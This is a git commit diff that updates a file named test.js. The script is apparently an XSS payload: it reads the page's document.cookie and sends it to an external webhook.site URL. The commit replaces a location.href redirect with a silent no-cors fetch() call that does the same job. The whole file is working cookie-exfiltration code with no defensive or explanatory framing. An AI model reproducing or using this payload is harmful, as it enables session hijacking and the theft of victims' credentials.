5ded45943980276632e86ba383f37814345adc51
wldldlq <smjy01@gmail.com>
2024-09-26 15:45:25 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,5 @@
 var cookieValue = document.cookie;
-location.href = "https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=" + encodeURIComponent(cookieValue);
+fetch("https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=" + encodeURIComponent(cookieValue), {
+    method: 'GET',
+    mode: 'no-cors'
+});
